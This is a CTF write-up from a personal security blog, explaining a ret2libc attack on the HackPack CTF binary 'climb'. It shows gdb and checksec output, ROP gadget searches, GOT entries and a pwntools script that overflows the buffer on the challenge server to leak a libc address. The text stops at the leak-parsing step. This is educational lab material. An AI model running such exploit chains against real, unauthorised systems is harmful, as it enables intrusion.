<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Pwn Ret2Libc | gr4n173</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="Pwn Ret2Libc" />
<meta name="author" content="gr4n173>" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I will explain about the pwn challenges that I solved during CTF." />
<meta property="og:description" content="I will explain about the pwn challenges that I solved during CTF." />
<link rel="canonical" href="http://localhost:4000/2020/07/11/ret2libc.html" />
<meta property="og:url" content="http://localhost:4000/2020/07/11/ret2libc.html" />
<meta property="og:site_name" content="gr4n173" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-07-11T00:00:00+05:45" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"http://localhost:4000/2020/07/11/ret2libc.html","headline":"Pwn Ret2Libc","dateModified":"2020-07-11T00:00:00+05:45","datePublished":"2020-07-11T00:00:00+05:45","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/07/11/ret2libc.html"},"author":{"@type":"Person","name":"gr4n173>"},"description":"I will explain about the pwn challenges that I solved during CTF.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/public/images/blackflag.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="gr4n173" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">gr4n173<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/"><i class="fab fa-twitter"></i></a><a class="color-red-hover" href="https://gr4n173.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/gr4n173"><i class="fab fa-github"></i></a><a class="color-blue-hover" href="https://www.facebook.com/profile.php?id=100038644863435"><i class="fab fa-facebook"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/680705408297730058"><i class="fab fa-discord"></i></a><a class="color-red-hover" href="mailto:me.gr4n173@protonmail.com"><i class="fab fa-mailchimp"></i></a><a class="color-cyan-hover" href="https://www.hackthebox.eu/home/users/profile/60443"><i class="fab fa-itch-io"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">

<img src="https://gravatar.com/avatar/6691d16a4bf77dcf1f54ee766349682a?s=256" class="author-avatar" />

Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Pwn & Exploitation.

</div>

<div class="post">
  <h1 class="post-title">Pwn Ret2Libc</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/ctf/">ctf</a>
      
      <a class="tag" href="/tag/hackpackctf/">hackpackctf</a>
      
      <a class="tag" href="/tag/pwn/">pwn</a>
      
      <a class="tag" href="/tag/BoF/">BoF</a>
      
      <a class="tag" href="/tag/ret2libc/">ret2libc</a>
      
      <a class="tag" href="/tag/Explotation&Pwning/">Explotation&Pwning</a>
      
  </div>
  
  <div class="post-date">Published on 11 Jul 2020</div>
  
  <div class="post-description"> I will explain about the pwn challenges that I solved during CTF.</div>
  
  <h1 id="description">Description</h1>

<p>Hello pwners !! It’s been a long time since the last post. I was unable to continue my series on <code class="highlighter-rouge">Exploitation&amp;Pwning</code> due to my busy schedule. But anyway I’m here with the <code class="highlighter-rouge">second</code> post on <code class="highlighter-rouge">Exploitation&amp;Pwning </code> series. You can read my first post of this series <a href="https://gr4n173.github.io/2020/05/01/hackpack-ctf-pwn.html">here</a>. Today I will try to explain about <code class="highlighter-rouge">ret2libc</code> attack.</p>

<h2 id="ret2libc">Ret2libc</h2>
<p>“Return-to-Libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine i.e. <code class="highlighter-rouge">return address</code> on a call stack by an <code class="highlighter-rouge">address</code> of a subroutine that is already present in the process executable memory. Bypassing the <code class="highlighter-rouge">no-execute bit</code> feature (if present) and getting a shell by injecting the code as required.</p>

<p>In order to be favorable to this attack, attacker can only call pre-existing functions like (puts, read, printf, libcstartmain, etc as per <code class="highlighter-rouge">elf</code> file).</p>

<h2 id="pwn-challenges">Pwn Challenges</h2>
<h3 id="climb">climb</h3>
<h4 id="description-396">Description [396]</h4>
<p>Can you help me climb the rope?</p>

<p><code class="highlighter-rouge">nc cha.hackpack.club 41702</code></p>

<h4 id="file-climb">File: <a href="/public/files/ctf/climb">climb</a></h4>

<p>Solution:- As soon as I downloaded and ran the file it displayed with some description as</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="o">@</span><span class="nx">gr4n173</span><span class="o">:~</span><span class="err">$</span>  <span class="o">./</span><span class="nx">climb</span>
<span class="nx">Stranger</span><span class="o">:</span> <span class="nx">Help</span><span class="o">!</span> <span class="nx">I</span><span class="err">'</span><span class="nx">m</span> <span class="nx">stuck</span> <span class="nx">down</span> <span class="nx">here</span><span class="o">.</span> <span class="nx">Can</span> <span class="nx">you</span> <span class="nx">help</span> <span class="nx">me</span> <span class="nx">climb</span> <span class="nx">the</span> <span class="nx">rope</span><span class="o">?</span>
<span class="nx">How</span> <span class="nx">will</span> <span class="nx">you</span> <span class="nx">respond</span><span class="o">?</span> 
</code></pre></div></div>

<p>After this, I grabbed <code class="highlighter-rouge">gdb</code> and started to check the protection mechanism.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="nx">gdb</span> <span class="o">-</span><span class="nx">q</span> <span class="nx">climb</span>
<span class="nx">GEF</span> <span class="k">for</span> <span class="nx">linux</span> <span class="nx">ready</span><span class="p">,</span> <span class="nx">type</span> <span class="nx">gef</span> <span class="nx">to</span> <span class="nx">start</span><span class="p">,</span> <span class="nx">gef</span> <span class="nx">config</span> <span class="nx">to</span> <span class="nx">configure</span>
<span class="mi">78</span> <span class="nx">commands</span> <span class="nx">loaded</span> <span class="k">for</span> <span class="nx">GDB</span> <span class="mf">9.1</span> <span class="nx">using</span> <span class="nx">Python</span> <span class="nx">engine</span> <span class="mf">3.8</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">2</span> <span class="nx">commands</span> <span class="nx">could</span> <span class="k">not</span> <span class="nx">be</span> <span class="nx">loaded</span><span class="p">,</span> <span class="nx">run</span> <span class="sb">`gef missing`</span> <span class="nx">to</span> <span class="nx">know</span> <span class="nx">why</span><span class="o">.</span>
<span class="nx">Reading</span> <span class="nx">symbols</span> <span class="nx">from</span> <span class="nx">climb</span><span class="o">...</span>
<span class="p">(</span><span class="nx">No</span> <span class="nx">debugging</span> <span class="nx">symbols</span> <span class="nx">found</span> <span class="nx">in</span> <span class="nx">climb</span><span class="p">)</span>
<span class="nx">gef</span><span class="err">➤</span>  <span class="nx">checksec</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">checksec</span> <span class="k">for</span> <span class="s1">'/home/gr4n173/hackpack/pwn/climbfile/climb'</span>
<span class="nx">Canary</span>                        <span class="o">:</span> <span class="err">✘</span> 
<span class="nx">NX</span>                            <span class="o">:</span> <span class="err">✓</span> 
<span class="nx">PIE</span>                           <span class="o">:</span> <span class="err">✘</span> 
<span class="nx">Fortify</span>                       <span class="o">:</span> <span class="err">✘</span> 
<span class="nx">RelRO</span>                         <span class="o">:</span> <span class="nx">Partial</span>
</code></pre></div></div>

<p>As per protection mechanism, <code class="highlighter-rouge">NX(no-executable)</code> and <code class="highlighter-rouge">RelRO</code> was enabled so I couldn’t write the shellcode but instead I was able to use <code class="highlighter-rouge">got</code> writable address and get a shell. Likewise <code class="highlighter-rouge">Canary</code> disable indicated there was buffer overflow.</p>

<p>Let’s assume that <code class="highlighter-rouge">ASLR</code> was also enabled in the server.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">info</span> <span class="nx">functions</span>
<span class="nx">All</span> <span class="nb">defined</span> <span class="nx">functions</span><span class="o">:</span>

<span class="nx">Non</span><span class="o">-</span><span class="nx">debugging</span> <span class="nx">symbols</span><span class="o">:</span>
<span class="mh">0x00000000004004e8</span>  <span class="nx">_init</span>
<span class="mh">0x0000000000400510</span>  <span class="nx">puts</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400520</span>  <span class="nx">setbuf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400530</span>  <span class="nb">system</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400540</span>  <span class="nb">printf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400550</span>  <span class="nx">read</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400560</span>  <span class="nx">_start</span>
<span class="mh">0x0000000000400590</span>  <span class="nx">_dl_relocate_static_pie</span>
<span class="mh">0x00000000004005a0</span>  <span class="nx">deregister_tm_clones</span>
<span class="mh">0x00000000004005d0</span>  <span class="nx">register_tm_clones</span>
<span class="mh">0x0000000000400610</span>  <span class="nx">__do_global_dtors_aux</span>
<span class="mh">0x0000000000400640</span>  <span class="nx">frame_dummy</span>
<span class="mh">0x0000000000400647</span>  <span class="nx">_init_</span>
<span class="mh">0x0000000000400650</span>  <span class="nx">_glibc_</span>
<span class="mh">0x0000000000400659</span>  <span class="nx">_entry1_</span>
<span class="mh">0x0000000000400664</span>  <span class="nx">call_me</span>
<span class="mh">0x000000000040067f</span>  <span class="nb">main</span>
<span class="mh">0x00000000004006e0</span>  <span class="nx">__libc_csu_init</span>
<span class="mh">0x0000000000400750</span>  <span class="nx">__libc_csu_fini</span>
<span class="mh">0x0000000000400754</span>  <span class="nx">_fini</span>
</code></pre></div></div>
<p>Here, I noticed a <code class="highlighter-rouge">main</code> and <code class="highlighter-rouge">call_me</code> functions. Then disassembled <code class="highlighter-rouge">main</code> function to see the details.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">disass</span> <span class="nb">main</span>
<span class="nx">Dump</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="k">function</span> <span class="nf">main</span><span class="o">:</span>
   <span class="mh">0x000000000040067f</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>     <span class="nx">push</span>   <span class="nx">rbp</span>
   <span class="mh">0x0000000000400680</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>     <span class="nx">mov</span>    <span class="nx">rbp</span><span class="p">,</span><span class="nx">rsp</span>
   <span class="mh">0x0000000000400683</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>     <span class="nx">sub</span>    <span class="nx">rsp</span><span class="p">,</span><span class="mh">0x20</span>
   <span class="mh">0x0000000000400687</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>     <span class="nx">mov</span>    <span class="nx">rax</span><span class="p">,</span><span class="nx">QWORD</span> <span class="nx">PTR</span> <span class="p">[</span><span class="nx">rip</span><span class="o">+</span><span class="mh">0x2009c2</span><span class="p">]</span>        <span class="c1"># 0x601050 &lt;stdout@@GLIBC_2.2.5&gt;</span>
   <span class="mh">0x000000000040068e</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">esi</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x0000000000400693</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">rdi</span><span class="p">,</span><span class="nx">rax</span>
   <span class="mh">0x0000000000400696</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>    <span class="nx">call</span>   <span class="mh">0x400520</span> <span class="o">&lt;</span><span class="nx">setbuf</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
   <span class="mh">0x000000000040069b</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;:</span>    <span class="nx">lea</span>    <span class="nx">rdi</span><span class="p">,[</span><span class="nx">rip</span><span class="o">+</span><span class="mh">0xc6</span><span class="p">]</span>        <span class="c1"># 0x400768</span>
   <span class="mh">0x00000000004006a2</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>    <span class="nx">call</span>   <span class="mh">0x400510</span> <span class="o">&lt;</span><span class="nx">puts</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
   <span class="mh">0x00000000004006a7</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>    <span class="nx">lea</span>    <span class="nx">rdi</span><span class="p">,[</span><span class="nx">rip</span><span class="o">+</span><span class="mh">0xff</span><span class="p">]</span>        <span class="c1"># 0x4007ad</span>
   <span class="mh">0x00000000004006ae</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x00000000004006b3</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;:</span>    <span class="nx">call</span>   <span class="mh">0x400540</span> <span class="o">&lt;</span><span class="nb">printf</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
   <span class="mh">0x00000000004006b8</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;:</span>    <span class="nx">lea</span>    <span class="nx">rax</span><span class="p">,[</span><span class="nx">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
   <span class="mh">0x00000000004006bc</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span><span class="mh">0x1f4</span>
   <span class="mh">0x00000000004006c1</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">rsi</span><span class="p">,</span><span class="nx">rax</span>
   <span class="mh">0x00000000004006c4</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">edi</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x00000000004006c9</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;:</span>    <span class="nx">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nx">read</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
   <span class="mh">0x00000000004006ce</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x00000000004006d3</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;:</span>    <span class="nx">leave</span>  
   <span class="mh">0x00000000004006d4</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;:</span>    <span class="nx">ret</span>    
<span class="nx">End</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="o">.</span>
</code></pre></div></div>
<p>There you can see one variable with buffer of <code class="highlighter-rouge">0x20(32)</code> and a <code class="highlighter-rouge">read</code> function which took the 3 register to store the value. <code class="highlighter-rouge">read(0,variable, buffer_size)</code> as</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x00000000004006bc</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">edx</span><span class="p">,</span><span class="mh">0x1f4</span> <span class="c1">#buffersize of 500</span>
   <span class="mh">0x00000000004006c1</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">rsi</span><span class="p">,</span><span class="nx">rax</span>   <span class="c1">#variable</span>
   <span class="mh">0x00000000004006c4</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;:</span>    <span class="nx">mov</span>    <span class="nx">edi</span><span class="p">,</span><span class="mh">0x0</span>   <span class="c1">#0</span>
   <span class="mh">0x00000000004006c9</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;:</span>    <span class="nx">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nx">read</span><span class="o">@</span><span class="nx">plt</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Result from above indicated there was buffer overflow. So first thing was to find the <code class="highlighter-rouge">offset</code>. For that, you can visit my first post of <code class="highlighter-rouge">Exploitation&amp;Pwning</code> series <a href="https://gr4n173.github.io/2020/05/01/hackpack-ctf-pwn.html">here</a> to know detail about it.</p>

<p>After finding offset which was<code class="highlighter-rouge">40</code> bytes. Now I can redirect to anywhere I want. Only I need to do now is to <code class="highlighter-rouge">pop</code> one of the argument; sequence of arguments in <code class="highlighter-rouge">64 bit</code> are as <code class="highlighter-rouge">rdi;rsi;rdx;rcx;r8;r9</code>. Then searched the gadgets related to the poping an arguments as</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">ropper</span> <span class="o">--</span><span class="nx">search</span> <span class="s2">"pop r?i"</span>
<span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">Load</span> <span class="nx">gadgets</span> <span class="nx">from</span> <span class="nx">cache</span>
<span class="p">[</span><span class="nx">LOAD</span><span class="p">]</span> <span class="nx">loading</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
<span class="p">[</span><span class="nx">LOAD</span><span class="p">]</span> <span class="nx">removing</span> <span class="nx">double</span> <span class="nx">gadgets</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
<span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">Searching</span> <span class="k">for</span> <span class="nx">gadgets</span><span class="o">:</span> <span class="nx">pop</span> <span class="nx">r</span><span class="o">?</span><span class="nx">i</span>

<span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">File</span><span class="o">:</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">gr4n173</span><span class="o">/</span><span class="nx">climb</span>
<span class="mh">0x0000000000400743</span><span class="o">:</span> <span class="nx">pop</span> <span class="nx">rdi</span><span class="p">;</span> <span class="nx">ret</span><span class="p">;</span> 
<span class="mh">0x0000000000400741</span><span class="o">:</span> <span class="nx">pop</span> <span class="nx">rsi</span><span class="p">;</span> <span class="nx">pop</span> <span class="nx">r15</span><span class="p">;</span> <span class="nx">ret</span><span class="p">;</span>
</code></pre></div></div>
<p>Up to here I overflowed the <code class="highlighter-rouge">buffer</code> and <code class="highlighter-rouge">pop a argument</code> so that I can call to any address I want.</p>

<p>Since <code class="highlighter-rouge">binary</code> had <code class="highlighter-rouge">writable got</code> address due to the partial protection of <code class="highlighter-rouge">RelRO</code>  I can point to that address and leak. For that I used the functions which was available in the binary file.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">info</span> <span class="nx">functions</span>
<span class="nx">All</span> <span class="nb">defined</span> <span class="nx">functions</span><span class="o">:</span>

<span class="nx">Non</span><span class="o">-</span><span class="nx">debugging</span> <span class="nx">symbols</span><span class="o">:</span>
<span class="mh">0x00000000004004e8</span>  <span class="nx">_init</span>
<span class="mh">0x0000000000400510</span>  <span class="nx">puts</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400520</span>  <span class="nx">setbuf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400530</span>  <span class="nb">system</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400540</span>  <span class="nb">printf</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400550</span>  <span class="nx">read</span><span class="o">@</span><span class="nx">plt</span>
<span class="mh">0x0000000000400560</span>  <span class="nx">_start</span>
<span class="mh">0x0000000000400590</span>  <span class="nx">_dl_relocate_static_pie</span>
<span class="mh">0x00000000004005a0</span>  <span class="nx">deregister_tm_clones</span>
<span class="mh">0x00000000004005d0</span>  <span class="nx">register_tm_clones</span>
<span class="mh">0x0000000000400610</span>  <span class="nx">__do_global_dtors_aux</span>
<span class="mh">0x0000000000400640</span>  <span class="nx">frame_dummy</span>
<span class="mh">0x0000000000400647</span>  <span class="nx">_init_</span>
<span class="mh">0x0000000000400650</span>  <span class="nx">_glibc_</span>
<span class="mh">0x0000000000400659</span>  <span class="nx">_entry1_</span>
<span class="mh">0x0000000000400664</span>  <span class="nx">call_me</span>
<span class="mh">0x000000000040067f</span>  <span class="nb">main</span>
<span class="mh">0x00000000004006e0</span>  <span class="nx">__libc_csu_init</span>
<span class="mh">0x0000000000400750</span>  <span class="nx">__libc_csu_fini</span>
<span class="mh">0x0000000000400754</span>  <span class="nx">_fini</span>
</code></pre></div></div>
<p>Then searched for <code class="highlighter-rouge">got address</code> .</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gef</span><span class="err">➤</span>  <span class="nx">got</span>

<span class="nx">GOT</span> <span class="nx">protection</span><span class="o">:</span> <span class="nx">Partial</span> <span class="nx">RelRO</span> <span class="o">|</span> <span class="nx">GOT</span> <span class="nx">functions</span><span class="o">:</span> <span class="mi">5</span>
 
<span class="p">[</span><span class="mh">0x601018</span><span class="p">]</span> <span class="nx">puts</span><span class="o">@</span><span class="nx">GLIBC_2</span><span class="o">.</span><span class="mf">2.5</span>  <span class="err">→</span>  <span class="mh">0x7ffff7e54030</span>  <span class="c1">#this one</span>
<span class="p">[</span><span class="mh">0x601020</span><span class="p">]</span> <span class="nx">setbuf</span><span class="o">@</span><span class="nx">GLIBC_2</span><span class="o">.</span><span class="mf">2.5</span>  <span class="err">→</span>  <span class="mh">0x7ffff7e5adb0</span>
<span class="p">[</span><span class="mh">0x601028</span><span class="p">]</span> <span class="nb">system</span><span class="o">@</span><span class="nx">GLIBC_2</span><span class="o">.</span><span class="mf">2.5</span>  <span class="err">→</span>  <span class="mh">0x400536</span>
<span class="p">[</span><span class="mh">0x601030</span><span class="p">]</span> <span class="nb">printf</span><span class="o">@</span><span class="nx">GLIBC_2</span><span class="o">.</span><span class="mf">2.5</span>  <span class="err">→</span>  <span class="mh">0x7ffff7e34470</span>
<span class="p">[</span><span class="mh">0x601038</span><span class="p">]</span> <span class="nx">read</span><span class="o">@</span><span class="nx">GLIBC_2</span><span class="o">.</span><span class="mf">2.5</span>  <span class="err">→</span>  <span class="mh">0x7ffff7ecc5c0</span>
</code></pre></div></div>
<p>Up to this, my payload to leak the address was</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">payload</span> <span class="o">=</span> <span class="nx">offset</span> <span class="o">+</span> <span class="nx">pop_rdi</span> <span class="o">+</span> <span class="nx">puts</span><span class="o">@</span><span class="nx">got</span> <span class="o">+</span> <span class="nx">puts</span><span class="o">@</span><span class="nx">plt</span>
</code></pre></div></div>

<p><strong>Part1_exploit: -</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3
# part1exploit.py
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Import pwntools
</span>
<span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'cha.hackpack.club'</span><span class="p">,</span><span class="mi">41702</span><span class="p">)</span>
<span class="c1">#p = process("./climb") # start the vuln binary
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./climb"</span><span class="p">)</span><span class="c1"># Extract data from binary
</span><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span><span class="c1"># Find ROP gadgets
</span>
<span class="n">PUTS_PLT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span><span class="c1"># Same as ROPgadget --binary vuln | grep "pop rdi"
</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
<span class="c1">#Overflow buffer until return address
</span><span class="n">OFFSET</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#+ "B"*8
# Create rop chain
</span><span class="n">payload1</span> <span class="o">=</span> <span class="n">OFFSET</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p><strong>Output</strong> :-</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">part1_exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">cha</span><span class="o">.</span><span class="n">hackpack</span><span class="o">.</span><span class="n">club</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">41702</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/gr4n173/climb'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="mi">16</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="s">'./climb'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="p">:</span> <span class="mh">0x40050c</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="p">:</span> <span class="mh">0x601018</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="p">:</span> <span class="mh">0x400743</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="n">b</span><span class="s">'</span><span class="se">\xc0</span><span class="s">I</span><span class="se">\xe7</span><span class="s">X</span><span class="se">\xac\x7f</span><span class="s">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</code></pre></div></div>
<p>From the output of <code class="highlighter-rouge">part1 exploit</code> some <code class="highlighter-rouge">leak</code> was seen which was random everytime I ran the exploit. So that may be the address leaked. In order to check I tried to <code class="highlighter-rouge">strip</code> it and then unpacked as 8 bytes data.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Parse leaked address</span>
<span class="nx">recieved</span> <span class="o">=</span> <span class="nx">p</span><span class="o">.</span><span class="nx">recvline</span><span class="p">()</span><span class="o">.</span><span class="nx">strip</span><span class="p">()</span>
<span class="c1">#print(recieved)</span>
<span class="nx">leak</span> <span class="o">=</span>  <span class="nx">u64</span><span class="p">(</span><span class="nx">recieved</span><span class="o">.</span><span class="nx">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="nx">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="c1">#print(leak)</span>
